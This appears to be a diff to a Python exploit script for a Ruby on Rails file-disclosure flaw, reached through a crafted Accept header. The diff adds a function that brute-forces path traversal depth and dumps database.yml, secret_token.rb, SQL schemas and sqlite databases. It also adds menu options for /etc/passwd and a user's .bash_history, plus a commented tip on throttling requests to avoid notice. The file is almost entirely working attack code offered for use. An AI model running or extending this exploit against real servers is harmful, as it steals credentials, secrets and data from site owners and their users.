@@ -37,14 +37,41 @@ def read_file(url, file):
     return req
 
 def brute_force_data(url):
-	# function to brute force sensitive data 
-	# assuming the person did not rename ruby on rails stable directories
-	headers = {'Accept': file + '{{'}
-	above = '../'
-        
-        # time.sleep(random.randint(.5,3))
-        # uncomment this to be less noisy
-
+    # function to brute force sensitive data
+    # assuming the person did not rename ruby on rails stable directories
+    above = '../'
+    base_req = requests.get(url)
+    lines = [line.strip() for line in str(base_req.text).splitlines()]
+    files = ["db/seeds.rb", "db/structure.sql", "development.sqlite3",
+             "config/database.yml", "config/initializers/secret_token.rb"]
+    num = ''
+    for i in range(8):
+        file = above * i + files[0]
+        headers = {'Accept': file + '{{'}
+        req = requests.get(url, headers)
+        output = [line.strip() for line in str(req.text).splitlines()]
+        #get number of lines in file before attempting to read files to determine if successful
+        if len(lines) != len(output):
+            print('Dumping: ', files[0])
+            for line in output:
+                print(line)
+            num = i
+            break
+        #time.sleep(random.randint(.5, 3))
+        #uncomment this to be less noisy on the server
+    # now since we know where to look we can read sensitive files
+    if num != '':
+        files = files[1:]
+        for file in files:
+            file = above * num + file
+            headers = {'Accept': file + '{{'}
+            req = requests.get(url, headers)
+            output = [line.strip() for line in str(req.text).splitlines()]
+            # sanity check
+            if len(output) != len(lines) and lines[0] != output[0]:
+                print('Dumping: ', file)
+                for line in output:
+                    print(line)
 
 def main():
     banner()
@@ -52,7 +79,7 @@ def main():
     url = sys.argv[1]
     while True:
         try:
-            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for seeds.rb: \033[0m")
+            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for bash history, enter 4 for seeds.rb: \033[0m")
         except Exception:
             file = raw_input("\033[93m[!] Enter file to read (enter quit or q to exit): \033[0m")
         if file == 'quit' or file == 'q':
@@ -61,6 +88,9 @@ def main():
             file = '../../../../../../../../../etc/passwd'
         elif file == '2':
             file = '../../../../../../../../../proc/cpuinfo'
+        elif file == "3":
+            file = '../../../../../../../../../home/rails/.bash_history'
+            # replace rails with other user if applicable
         response = read_file(url, file)
         print(response.text)
 
